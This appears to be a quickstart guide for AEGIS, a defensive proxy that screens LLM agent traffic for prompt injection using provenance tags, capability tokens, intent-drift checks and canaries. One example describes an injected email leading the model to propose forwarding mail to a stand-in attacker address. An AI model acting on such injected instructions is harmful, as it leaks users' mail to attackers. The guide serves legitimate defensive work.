# AEGIS Quickstart

Three deployment cases an agentic builder actually faces. Pick the one that matches your stack.

> First check [WHO_SHOULD_USE.md](WHO_SHOULD_USE.md) — if AEGIS isn't the right fit, simpler tools will serve you better.

## The deployment model in one picture

```
   Your agent code
        │
        ▼
   anthropic.Anthropic(base_url="http://localhost:8080/v1/anthropic")
        │
        ▼
   ┌──────────────────────┐
   │  AEGIS proxy :8080   │ ─── 5 layers run here ───▶ decision log
   └──────────────────────┘
        │
        ▼
   api.anthropic.com  (real Claude)
```

Anthropic's, OpenAI's, and Google's SDKs all let you override the base URL. AEGIS speaks each provider's wire format natively, runs the five layers, then forwards to the real provider.

Everything below is plumbing for the three different surfaces.

---

## Case 1 — Anthropic API agent (the clean case)

The case AEGIS was built for. You have a Python or TypeScript agent calling `client.messages.create(...)` with tools defined.

### Step 1: run the proxy

```bash
docker run -d \
  --name aegis \
  -p 8080:8080 \
  -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
  -v $(pwd)/aegis-policy.yaml:/etc/aegis/policy.yaml:ro \
  -v aegis-logs:/var/aegis \
  ghcr.io/cwellbournewood/aegis:1.2.0
```

Or via Docker Compose ([deploy/docker-compose.yml](../deploy/docker-compose.yml)):

```bash
cd deploy
AEGIS_MASTER_KEY=$(openssl rand -hex 32) docker compose up -d
```

### Step 2: declare intent and mint capabilities

This is the "intent declaration" moment that unlocks the strongest layer (capability tokens) and the smartest layer (intent anchor). Find the place in your code where a user request becomes an agent task.

```python
from aegis.sdk import AegisClient
import anthropic

aegis = AegisClient(base_url="http://localhost:8080")

# When a user makes a top-level request, declare intent + mint capabilities.
session = aegis.session.create(
    user_intent="summarize my latest invoices and email me the totals",
    upstream="anthropic",
)

# Mint capability tokens for tools the user actually authorized.
# Tight constraints = strong defense.
session.capabilities.mint(
    "read_email",
    constraints={"folder": {"kind": "eq", "value": "invoices"}, "limit": {"kind": "max_len", "value": 50}},
)
session.capabilities.mint(
    "send_email",
    constraints={"to": {"kind": "eq", "value": "you@example.com"}},
)

# Use Claude as normal — point at the AEGIS proxy.
client = anthropic.Anthropic(
    base_url=session.proxy_url,
    api_key="sk-ant-...",  # your real Anthropic key
)

resp = client.messages.create(
    model="claude-sonnet-4-5",
    max_tokens=4096,
    tools=[...],
    messages=[{"role": "user", "content": "Pull my invoices and email me the totals."}],
    extra_body={
        "aegis": {
            "session_id": session.session_id,
            "capability_tokens": session.capability_tokens(),
        }
    },
)
```

If the model proposes `set_email_forwarding(to="attacker@evil.com")` — perhaps because a malicious email body told it to — three layers block it:

- **Lattice**: the proposed action's causal origin is L0 (retrieved email) → BLOCK
- **Capability**: no token was ever minted for `set_email_forwarding` → BLOCK
- **Intent drift**: "set email forwarding" is far from "summarize invoices" → BLOCK

### Step 3: tag retrieval sources correctly

When your agent retrieves content for the model, the AEGIS adapter automatically tags it based on the wire-format slot. But for clarity:

| Where the content came from | Wire-format slot | Tag |
|---|---|---|
| Your application's hardcoded system prompt | `system` | L3 |
| The authenticated user's input | `messages[].role == "user"` | L2 |
| Your own RAG / vector store | `tool_result` block (your retrieval tool) | L0 (configurable to L1) |
| Web fetch, scraped email, third-party API | `tool_result` block | L0 |

If you stuff retrieved content into a `user` message, AEGIS will see it as L2 — and that's exactly what the trust model is built to prevent. Use the right wire-format slot.

---

## Case 2 — Claude Code (the harder case)

Claude Code is itself an agent. It runs on your machine and calls Anthropic's API directly, using bash, file edits, and MCP servers as its tools. Two integration paths exist with meaningfully different protection levels.

### Path A — Proxy interception (lightest touch)

Five-minute install. Claude Code respects standard Anthropic env vars.

```bash
# 1. Run AEGIS locally.
docker run -d --name aegis -p 8080:8080 \
  -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
  ghcr.io/cwellbournewood/aegis:1.2.0

# 2. Point Claude Code at it.
export ANTHROPIC_BASE_URL="http://localhost:8080/v1/anthropic"
claude  # normal Claude Code session, now flowing through AEGIS
```

This gets you:

- ✓ **CCPT** (every chunk of context is provenance-tagged)
- ✓ **Canary tripwires** (catches obvious injection attempts)
- ✓ **Intent drift detection** (catches major divergence from the user's stated task)
- ✓ **Tamper-evident audit log** (every decision recorded with hash chain)
- ✗ **Capability tokens** (no natural place to declare intent — see Path B)

You're roughly at "60% of AEGIS's value" with a 5-minute install — the structural layers minus the strongest one. For many users this is enough.

### Path B — MCP-server wrapping (deeper integration)

Where AEGIS earns its keep with Claude Code is on the **MCP servers** you've connected. Each MCP server is a tool source — and historically a known indirect-injection vector. AEGIS ships an `aegis mcp-wrap` command:

```bash
# Instead of:
claude mcp add github "npx @modelcontextprotocol/server-github"

# Wrap it:
claude mcp add github "aegis mcp-wrap --proxy-url http://localhost:8080 --policy strict -- npx @modelcontextprotocol/server-github"
```

Now every tool response from that MCP server is:

1. Tagged L0 on entry (untrusted by default)
2. Canary-scanned — if the MCP server's response somehow includes a leaked canary token, the wrapper blocks immediately
3. Logged in the AEGIS decision log with full provenance

This is the cleanest match of AEGIS's design to Claude Code's reality: defend the MCP boundary, where attacker-controlled content actually enters.

**Recommendation:** use both paths. Path A is the model-traffic baseline; Path B hardens each MCP server you trust to varying degrees.

---

## Case 3 — Other agentic frameworks (LangGraph, CrewAI, AutoGen, custom)

These all eventually call the Anthropic / OpenAI / Google SDK under the hood. Deployment is identical to Case 1: set `base_url`, declare intent at the start of each user-facing task, mint capabilities for tools that task should be allowed to use.

Framework-specific guidance for the **intent declaration moment** — i.e., where in your code a user request becomes an agent task:

| Framework | Where to declare intent |
|---|---|
| **LangGraph** | Graph entry node. Before invoking the graph, create an AEGIS session with `user_intent`. |
| **CrewAI** | Crew kickoff. Wrap `crew.kickoff()` to create the session and inject capability tokens into agent contexts. |
| **AutoGen** | UserProxyAgent's first message handler. The user's initial task becomes the `user_intent`. |
| **Custom** | Wherever you turn a user request into an agent task — typically your top-level handler. |

```python
# Generic shape
session = aegis.session.create(user_intent=user_request, upstream="anthropic")
for tool_name in dangerous_tools_this_request_needs:
    session.capabilities.mint(tool_name, constraints=tight_constraints_for(tool_name))

# Pass session.proxy_url and session.capability_tokens() into your framework's
# Anthropic client configuration.
```

---

## The starter policy

Drop this at `aegis-policy.yaml` and mount it into the container. Annotated, opinionated, production-leaning.

```yaml
mode: balanced  # strict | balanced | permissive

flows:
  # The lattice rules. Default is strict — L0 cannot authorize tool calls.
  - { from: L0, to: tool_call, decision: BLOCK }
  - { from: L1, to: tool_call, decision: WARN, require: [capability_token] }
  - { from: L2, to: tool_call, decision: ALLOW, require: [capability_token] }
  - { from: L3, to: tool_call, decision: ALLOW }

anchor:
  threshold_balanced: 0.22   # multi-anchor accumulation handles legit drift
  threshold_strict: 0.40
  embedder:
    kind: hashing            # default; switch to sentence-transformers for higher quality
    dim: 384

canary:
  enabled: true
  count: 3                   # multiple distinct canaries per session

capability:
  default_ttl_seconds: 600
  nonce_store:
    kind: memory             # for multi-replica HA: kind: redis + url
log_path: /var/aegis/decisions.log
session_ttl_seconds: 43200   # 12 hours
```

The two knobs most worth tuning for an agentic user:

- **`mode`**: start in `permissive` for a week. Log everything, block nothing. Review the decision log to see what *would have been* blocked. Then promote to `balanced`. Only move to `strict` once your false-positive rate is acceptable and the deployment is high-stakes.
- **Per-tool capability constraints**: the tighter the constraints, the stronger the defense. `constraint_eq("alice@example.com")` beats `constraint_any()` by orders of magnitude.

Validate before deploying:

```bash
aegis policy validate ./aegis-policy.yaml
```

---

## What "activation" looks like end-to-end

### First day

Install Docker, run the proxy with default policy, point your agent at it via `ANTHROPIC_BASE_URL`. You're now logging every decision — that alone is valuable for understanding what your agent actually does.

```bash
docker run -d --name aegis -p 8080:8080 \
  -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
  ghcr.io/cwellbournewood/aegis:1.2.0
export ANTHROPIC_BASE_URL=http://localhost:8080/v1/anthropic
```

### First week

Review the decision log. Tune the policy file based on what you see. If you use Claude Code with MCP servers, wrap them with `aegis mcp-wrap`. Decide which tools are dangerous enough to require capability tokens.

```bash
aegis logs --tail 100 --follow
aegis verify ./aegis-decisions.log
```

### First month

Integrate intent declaration into your agent's user-facing entry points (the SDK call to `session.create` with `user_intent`). This unlocks the strongest layer (capability tokens) and the smartest layer (intent anchor). Without this step, AEGIS still gives you provenance + lattice + canaries + audit; with it, the full structural protection turns on.

---

## Smoke test — verify it's working

```bash
# Healthcheck
curl http://localhost:8080/aegis/health

# Run the bundled adversarial corpus
docker exec aegis aegis bench --mode balanced

# Should show:
#   100% block rate on direct/indirect/memory/multi-agent attack categories
#   0% false-positive rate on benign cases
```

Or check Prometheus:

```bash
curl http://localhost:8080/metrics | grep aegis_requests_total
```

---

## Common pitfalls

**"AEGIS is firing on every read."** Your policy is misconfigured. AEGIS's design intent is friction at *dangerous tool boundaries* (writes, sends, deletes, shell), not at every model turn. Move read-only tools out of `capability.require_for_tools` (or, equivalently, mint long-TTL non-single-use tokens for them at session start).

**"Intent drift blocks legitimate multi-step tasks."** Use the multi-anchor support — when the user adds a new turn, the orchestrator widens the anchor automatically. If false positives still appear, lower `threshold_balanced` to 0.18.

**"Capability tokens are a hassle to mint everywhere."** Mint them at the session-creation moment, with broad-but-not-wildcard constraints. The point is *some* binding to user intent, not perfect parameter prediction. You can also use `constraint_any()` on a specific tool while still benefiting from the lattice + drift + canary layers.

**"My MCP server is producing tool responses that get blocked."** Wrap it with `aegis mcp-wrap`. The wrapper handles the L0-tagging boundary correctly.

---

## Next steps

- [Architecture](ARCHITECTURE.md) — how the layers compose internally
- [Threat Model](THREAT_MODEL.md) — what AEGIS defends against (and what it doesn't)
- [Operator Guide](OPERATOR.md) — production deployment, tuning, observability, Redis HA
- [Mental Model](MENTAL_MODEL.md) — each layer explained with analogies
